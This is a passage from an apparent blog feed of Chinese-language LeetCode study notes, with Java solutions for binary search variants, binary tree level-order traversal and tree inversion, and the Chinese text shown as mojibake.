        <content type="html"><![CDATA[<h4 id="äºŒåˆ†æŸ¥æ‰¾"><a href="#äºŒåˆ†æŸ¥æ‰¾" class="headerlink" title="äºŒåˆ†æŸ¥æ‰¾"></a>äºŒåˆ†æŸ¥æ‰¾</h4><p>linkï¼š<a href="https://leetcode.cn/problems/binary-search/description/">704. äºŒåˆ†æŸ¥æ‰¾ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240923152617533.png" alt="image-20240923152617533"></p><h5 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>é¢˜ç›®ç»™å‡ºæ•°ç»„å‡åº ï¼Œæƒ³åˆ°äºŒåˆ†æŸ¥æ‰¾ï¼ˆå¥½å§å…¶å®é¢˜ç›®ä¹Ÿç»™å‡ºæ¥äº†wï¼‰<br>æ‰¾åˆ°midï¼Œæ ¹æ®é€»è¾‘å¤§å°ç¼©å°èŒƒå›´æ¯”è¾ƒ.</p><h6 id="å…¨åŒ…å›´-lefg-right"><a href="#å…¨åŒ…å›´-lefg-right" class="headerlink" title="å…¨åŒ…å›´[lefg,right]"></a>å…¨åŒ…å›´[lefg,right]</h6><p>å‡å¦‚æ•°ç»„å¤§å°ä¸º6ï¼Œå–å€¼èŒƒå›´å°±æ˜¯[0,5].é—­åŒºé—´ä½¿å¾—å®šä¹‰left &#x3D; 0ï¼Œright &#x3D; nums.length-1ï¼ˆé˜²æ­¢è¶Šç•ŒæŒ‡é’ˆæ— æ•ˆï¼Œä¹Ÿæ˜¯æ ¹æ®æ­¤å¤„å¯ä»¥åæ¨æ²¡æœ‰å·¦å¼€å³é—­æƒ…å†µï¼‰<br>leftæŒ‡é’ˆæ˜¯0.rightæ˜¯5ï¼Œè¿™ä¸ªæ—¶å€™left &#x3D;&#x3D; rightæ˜¯æœ‰æ•ˆçš„ï¼Œç»“æŸæ¡ä»¶ä¹Ÿå°±æ˜¯left&lt;&#x3D;rightï¼Œå†æ ¹æ®midä½ç½®è¿›è¡Œåˆ¤æ–­ï¼Œtargetæ˜¯å†midå·¦è¾¹è¿˜æ˜¯å³è¾¹æˆ–è€…æ˜¯å¹¸è¿çš„æŸ¥æ‰¾åˆ°ç›®æ ‡ä½ç½®.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">       </span><br><span class="line">        <span class="comment">//çœ‹åˆ°æ•°ç»„ä¹ æƒ¯æ€§ååº”è¶Šç•Œé—®é¢˜</span></span><br><span class="line">        <span class="comment">//é—­åŒºé—´</span></span><br><span class="line">       </span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target) &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; target) &#123;</span><br><span class="line">                right = mid -<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="å·¦é—­å³å¼€-left-rigjht"><a href="#å·¦é—­å³å¼€-left-rigjht" class="headerlink" title="å·¦é—­å³å¼€[left,rigjht)"></a>å·¦é—­å³å¼€[left,rigjht)</h6><p>åŒæ ·çš„æ¡ä»¶ä½†æ˜¯rightæŒ‡é’ˆæŒ‡å‘nums.lengthï¼Œå¯¹åº”çš„left &#x3D;&#x3D; rightæ²¡æœ‰æ„ä¹‰.æ‰€ä»¥åˆ¤æ–­æ¡ä»¶æ˜¯left &lt; right.å¦‚æœtargetåœ¨nums[mid]å·¦è¾¹çš„è¯ï¼ŒæŠŠleftèµ‹å€¼ä¸ºmid+1ï¼Œä½†æ˜¯åè¿‡æ¥<strong>targetåœ¨nums[mid]å³è¾¹çš„è¯ï¼Œå°±è¦èµ‹å€¼leftä¸ºmid</strong>ã€å³è¾¹å¼€midæŒ‡çš„æŒ‡é’ˆä¸å‚åŠ ä¸‹ä¸€æ¬¡å¾ªç¯åˆ¤è¯»ã€‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123; </span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target) &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; target) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="å…¨å¼€-left-right"><a href="#å…¨å¼€-left-right" class="headerlink" title="å…¨å¼€(left,right)"></a>å…¨å¼€(left,right)</h6><p>åˆ†æåŒä¸Šè¿° åªä¸è¿‡å…¨å¼€ä¸¤ç§æƒ…å†µéƒ½èµ‹å€¼ä¸ºmid.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123; </span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left + <span class="number">1</span> &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target) &#123;</span><br><span class="line">                left = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; target) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h5 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h5><p><strong>1.åŒºé—´é—®é¢˜ï¼Œåˆ¤æ–­æ¡ä»¶æ˜¯å¦èƒ½éå†æ‰€æœ‰ä¸‹æ ‡.</strong><br><strong>2.å…¶å®å°†midå–å€¼æ–¹æ³•æ”¹æˆleft+((right-left)&gt;&gt;1)ã€å’Œ &#x2F; 2ä¸€æ ·ã€‘æ˜¯æœ€å¥½çš„ï¼Œç›´æ¥ç”¨ï¼ˆleft+rightï¼‰&#x2F; 2å’Œï¼ˆleft+rightï¼‰&#x2F;&#x2F; 2 ã€å‘ä¸‹å–æ•´ã€‘ åªé€‚ç”¨äºå°‘æ•°æ®å…¨åŒ…å›´æƒ…å†µï¼Œæ­¤æƒ…å†µleftå’Œrightéƒ½æ˜¯intèŒƒå›´ï¼Œå–å€¼èŒƒå›´æ˜¯-2147483648-2147483647ï¼Œå½“ä¸¤ä¸ªæ•°å€¼å¾ˆæ¥è¿‘è¾¹ç•Œå€¼çš„æ—¶å€™ç›¸åŠ å¾ˆå®¹æ˜“å‡ºç°è´Ÿå€¼</strong><br><strong>3.ï¼ˆright-left ï¼‰&#x2F; 2 åªæ˜¯è¡¨ç¤ºäº†leftå’ŒrightæŒ‡é’ˆä¹‹é—´è·ç¦»çš„ä¸€åŠï¼Œä¸èƒ½è¡¨ç¤ºmidæ‰€åœ¨çš„ä½ç½®ï¼Œç”¨leftåŠ ä¸Šè·ç¦»çš„ä¸€åŠåˆšå¥½èƒ½è¿›è¡Œè¡¨ç¤º.</strong></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubã®Algorithm.0x10</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0x10/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0x10/</url>
      
        <content type="html"><![CDATA[<h4 id="äºŒå‰æ ‘çš„å±‚åºéå†ï¼ˆå¹¿åº¦ä¼˜å…ˆéå†ï¼‰"><a href="#äºŒå‰æ ‘çš„å±‚åºéå†ï¼ˆå¹¿åº¦ä¼˜å…ˆéå†ï¼‰" class="headerlink" title="äºŒå‰æ ‘çš„å±‚åºéå†ï¼ˆå¹¿åº¦ä¼˜å…ˆéå†ï¼‰"></a>äºŒå‰æ ‘çš„å±‚åºéå†ï¼ˆå¹¿åº¦ä¼˜å…ˆéå†ï¼‰</h4><p>linkï¼š<a href="https://leetcode.cn/problems/binary-tree-level-order-traversal/description/">102. äºŒå‰æ ‘çš„å±‚åºéå† - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>é¢˜ç›®è¯´æ˜ä»å·¦å¾€å³è¿›è¡Œéå†ï¼Œå…¶å®å¯ä»¥å ªç§°ç»™äºŒå‰æ ‘æ¯ä¸€å±‚éƒ½ç”»æ¨ªçº¿åˆ†å‰²å¼€æ¥ï¼Œleft firstï¼Œright last.</p><p><img src="/../imgs/2024-10/image-20241108151829868.png" alt="image-20241108151829868"></p><p>nä»£è¡¨null è¾“å‡ºåªä»å­˜åœ¨çš„èŠ‚ç‚¹ä¸­è¾“å‡º.<br>æœ€å…ˆæƒ³åˆ°çš„å°±æ˜¯é€’å½’ï¼ŒæŒ‰ç…§åˆ›å»ºæ ‘çš„æ€è·¯ï¼Œpassæ‰ç©ºèŠ‚ç‚¹å°±å¥½.<br>å…ˆå‰åšè¿‡é˜Ÿåˆ—æ¨¡æ‹Ÿæ ˆï¼Œå…¶å®è¿™é‡Œç”¨é˜Ÿåˆ—æ¥è§£å†³ä¹Ÿå¾ˆä¼˜é›….</p><h6 id="é˜Ÿåˆ—BFS"><a href="#é˜Ÿåˆ—BFS" class="headerlink" title="é˜Ÿåˆ—BFS"></a>é˜Ÿåˆ—BFS</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; ret = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">//è·å–å½“å‰é˜Ÿåˆ—çš„å¤§å°</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            List&lt;Integer&gt; tmp = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">while</span>(size != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                tmp.add(cur.val);</span><br><span class="line">                size--;</span><br><span class="line">                <span class="keyword">if</span>(cur.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.offer(cur.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(cur.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.offer(cur.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ret.add(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong><br>é«˜åº¦:äºŒå‰æ ‘ä¸­ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹åˆ°å¶å­ç»“ç‚¹çš„è·ç¦»<br>æ·±åº¦:äºŒå‰æ ‘ä¸­ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹åˆ°<a href="https://so.csdn.net/so/search?q=%E6%A0%B9%E8%8A%82%E7%82%B9&spm=1001.2101.3001.7020">æ ¹èŠ‚ç‚¹</a>çš„è·ç¦»</p><p><strong><code>List&lt;List&lt;Integer&gt;&gt;</code> çš„å¿…è¦æ€§</strong></p><p>æ¯ä¸€å±‚çš„èŠ‚ç‚¹å€¼éœ€è¦å•ç‹¬å­˜å‚¨åœ¨ä¸€ä¸ªåˆ—è¡¨ä¸­ï¼Œç„¶åå°†æ‰€æœ‰å±‚çš„åˆ—è¡¨æ•´åˆåœ¨ä¸€ä¸ªå¤§åˆ—è¡¨ä¸­ã€‚å› æ­¤ï¼Œæœ€ç»ˆç»“æœéœ€è¦ä¸€ä¸ªåµŒå¥—çš„åˆ—è¡¨ç»“æ„ã€‚</p><h4 id="åè½¬äºŒå‰æ ‘"><a href="#åè½¬äºŒå‰æ ‘" class="headerlink" title="åè½¬äºŒå‰æ ‘"></a>åè½¬äºŒå‰æ ‘</h4><p>linkï¼š<a href="https://leetcode.cn/problems/invert-binary-tree/description/">226. ç¿»è½¬äºŒå‰æ ‘ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>æ ¹æ®é¢˜æ„ï¼Œçœ‹åˆ°çš„æ˜¯å·¦å³å­æ ‘å†…éƒ¨äº¤æ¢è‡ªèº«å­©å­èŠ‚ç‚¹ï¼Œç„¶åå·¦å³å­æ ‘åˆè¿›è¡Œäº†äº¤æ¢.<br>é€’å½’äº¤æ¢å°±ç§’äº†.<br>å…¶å®å¯ä»¥è€è€å®å®çš„é€ä¸ªå·¦å³äº¤æ¢ï¼Œä¹Ÿå¯ä»¥æŒ‰ç…§ä¸Šä¸€é¢˜å±‚åºéå†çš„ä¸€å±‚å±‚äº¤æ¢ï¼ˆè§‚å¯Ÿåˆ°æœ€åä¸€å±‚æ˜¯1ï¼Œ3ï¼Œ6ï¼Œ9â€”â€”&gt;9ï¼Œ6ï¼Œ3ï¼Œ1ï¼‰</p><h6 id="DFSï¼ˆé€’å½’ï¼‰"><a href="#DFSï¼ˆé€’å½’ï¼‰" class="headerlink" title="DFSï¼ˆé€’å½’ï¼‰"></a>DFSï¼ˆé€’å½’ï¼‰</h6><p>æ³¨æ„å‰åºéå†å’Œååºéå†å¯ä»¥ï¼Œä¸­åºéå†ä¸è¡Œï¼ˆä¸ä¿¡ä½ å°±ç”»å›¾æ¨æ¨çœ‹ï¼‰<br>å‰åº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> root.left;</span><br><span class="line">        root.left= root.right ;</span><br><span class="line">        root.right = tmp;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        invertTree(root.left);</span><br><span class="line">        invertTree(root.right);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ååº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ååºéå†ï¼šå…ˆé€’å½’åœ°ç¿»è½¬å·¦å³å­æ ‘</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> invertTree(root.left);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> invertTree(root.right);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// äº¤æ¢å·¦å³å­æ ‘</span></span><br><span class="line">        root.left = right;</span><br><span class="line">        root.right = left;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">        ArrayDeque&lt;TreeNode&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        deque.offer(root);</span><br><span class="line">        <span class="keyword">while</span> (!deque.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> deque.size();</span><br><span class="line">            <span class="keyword">while</span> (size-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> deque.poll();</span><br><span class="line">                swap(node);</span><br><span class="line">                <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;deque.offer(node.left);&#125;</span><br><span class="line">                <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;deque.offer(node.right);&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">temp</span> <span class="operator">=</span> root.left;</span><br><span class="line">        root.left = root.right;</span><br><span class="line">        root.right = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Tips</strong></p><p>äººæœºæœ‰è¯è¯´.<br><strong>DFS å’Œ BFS çš„åŒºåˆ«</strong></p><ol><li><strong>éå†é¡ºåº</strong><ul><li><strong>DFSï¼ˆDepth First Searchï¼Œæ·±åº¦ä¼˜å…ˆæœç´¢ï¼‰</strong>ï¼šä¼˜å…ˆæ·±å…¥åˆ°æ¯ä¸ªèŠ‚ç‚¹çš„å­èŠ‚ç‚¹ï¼Œé€šå¸¸ä¼šå…ˆè®¿é—®åˆ°æŸä¸ªåˆ†æ”¯çš„æœ€åº•å±‚èŠ‚ç‚¹ï¼Œç„¶åå†å›æº¯åˆ°ä¸Šå±‚èŠ‚ç‚¹å»è®¿é—®å…¶ä»–åˆ†æ”¯ã€‚å¸¸è§çš„ DFS å®ç°æœ‰ä¸‰ç§ï¼šå‰åºéå†ï¼ˆPreorderï¼‰ã€ä¸­åºéå†ï¼ˆInorderï¼‰ã€ååºéå†ï¼ˆPostorderï¼‰ã€‚</li><li><strong>BFSï¼ˆBreadth First Searchï¼Œå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼‰</strong>ï¼šä¼˜å…ˆè®¿é—®æ¯ä¸€å±‚çš„èŠ‚ç‚¹ï¼Œç„¶åå†é€å±‚æ·±å…¥ã€‚BFS ä¸€èˆ¬ä½¿ç”¨é˜Ÿåˆ—ï¼ˆ<code>Queue</code>ï¼‰æ¥å®ç°ï¼ŒæŒ‰å±‚æ¬¡é€ä¸€å¤„ç†èŠ‚ç‚¹ã€‚</li></ul></li><li><strong>æ•°æ®ç»“æ„</strong><ul><li><strong>DFS</strong>ï¼šå¸¸ç”¨é€’å½’æˆ–æ ˆæ¥å®ç°ï¼Œé€’å½’ä¼šéšå¼ä½¿ç”¨ç³»ç»Ÿæ ˆï¼Œè€Œéé€’å½’çš„å®ç°éœ€è¦æ˜¾å¼çš„æ ˆã€‚</li><li><strong>BFS</strong>ï¼šé€šå¸¸ä½¿ç”¨é˜Ÿåˆ—æ¥å®ç°ï¼Œå› ä¸ºå®ƒæŒ‰ç…§å±‚æ¬¡é¡ºåºè®¿é—®èŠ‚ç‚¹ã€‚</li></ul></li><li><strong>æ—¶é—´å¤æ‚åº¦å’Œç©ºé—´å¤æ‚åº¦</strong><ul><li><strong>æ—¶é—´å¤æ‚åº¦</strong>ï¼šDFS å’Œ BFS çš„æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯ O(n)ï¼Œå…¶ä¸­ nnn æ˜¯èŠ‚ç‚¹çš„æ•°é‡ï¼Œå› ä¸ºæ¯ä¸ªèŠ‚ç‚¹éƒ½éœ€è¦è¢«è®¿é—®ä¸€æ¬¡ã€‚</li><li><strong>ç©ºé—´å¤æ‚åº¦</strong>ï¼šDFS çš„ç©ºé—´å¤æ‚åº¦å–å†³äºé€’å½’çš„æ·±åº¦ï¼Œæœ€åæƒ…å†µä¸‹æ˜¯ O(h)ï¼ˆæ ‘çš„é«˜åº¦ï¼‰ï¼›BFS çš„ç©ºé—´å¤æ‚åº¦åˆ™æ˜¯ O(w)ï¼Œå…¶ä¸­ wæ˜¯æ ‘çš„æœ€å¤§å®½åº¦ã€‚</li></ul></li></ol><h4 id="å¯¹ç§°äºŒå‰æ ‘"><a href="#å¯¹ç§°äºŒå‰æ ‘" class="headerlink" title="å¯¹ç§°äºŒå‰æ ‘"></a>å¯¹ç§°äºŒå‰æ ‘</h4><p>linkï¼š<a href="https://leetcode.cn/problems/symmetric-tree/description/">101. å¯¹ç§°äºŒå‰æ ‘ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ-2"><a href="#æ€è·¯åˆ†æ-2" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>çœ‹é¢˜ç›®ç¡®å®è§‰å¾—å¾ˆå¯¹ç§°å•Šï¼Œçœ‹å›¾åˆ†æå·¦å­æ ‘å’Œå³å­æ ‘çš„éå†é¡ºåºï¼Œå·¦å­æ ‘æ˜¯å·¦å³ä¸­ï¼Œé‚£å’Œå³å­æ 